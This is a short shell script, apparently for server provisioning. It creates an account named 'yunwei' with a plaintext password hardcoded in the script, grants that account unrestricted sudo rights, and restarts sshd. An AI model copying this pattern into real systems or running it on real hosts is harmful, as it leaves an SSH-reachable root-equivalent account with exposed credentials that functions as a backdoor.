#!/bin/sh

user_name="yunwei"
user_passwd="yunwei@095169"


outcome=$(cat /etc/passwd | grep ${user_name})
if [ "${outcome}" != "" ]
then
    return
fi

adduser --no-create-home ${user_name}
(echo "${user_passwd}" ; sleep 1 ; echo "${user_passwd}") | passwd ${user_name}

echo "${user_name} ALL=(ALL) ALL" >> /etc/sudoers

service sshd restart